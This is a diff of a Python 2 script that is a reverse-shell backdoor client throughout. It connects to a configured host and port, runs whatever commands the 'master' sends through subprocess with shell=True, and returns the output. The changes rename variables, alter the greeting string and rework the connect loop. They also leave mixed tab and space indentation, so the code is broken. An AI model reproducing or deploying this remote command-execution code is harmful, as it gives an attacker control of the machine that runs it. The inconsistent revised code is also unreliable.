@@ -9,17 +9,17 @@ HOST = '127.0.0.1'
 PORT = 22
 
 def connect((host, port)):
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((host, port))
-        return s
+        socketHolder = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        socketHolder.connect((host, port))
+        return socketHolder
 
-def run_shell_cmd(s):
-        data = s.recv(1024)
+def run_shell_cmd(socketHolder):
+        data = socketHolder.recv(1024)
 
-        if data == "quit\n":
-                s.close()
+        if data == "quit":
+                socketHolder.close()
                 sys.exit(0)
-        elif len(data)==0:
+        elif len(data) == 0:
                 return True
         else:
                 proc = subprocess.Popen(data, shell=True,
@@ -28,22 +28,22 @@ def run_shell_cmd(s):
                 
                 stdout_value = proc.stdout.read() + proc.stderr.read()
                 
-                s.send(stdout_value)
+                socketHolder.send(stdout_value)
                 return False
 
 def main():
-        while True:
-                socket_alive=True
+	socketAlive = True
+	
+        while socketAlive:
+		dataReceived = True
                 try:
-                        s=connect((HOST,PORT))
-                        time.sleep(2)
-                        s.send('Test')
-                        while socket_alive:
-                                commands_from_master=run_shell_cmd(s)
-                        s.close()
+                        socketHolder = connect((HOST,PORT))
+                        socketHolder.send('Night or day?')
+                        while dataReceived:
+				commandsFromMaster = run_shell_cmd(socketHolder)
+                        socketHolder.close()
                 except socket.error:
                         pass
-                time.sleep(5)
 
 if __name__ == "__main__":
         sys.exit(main())
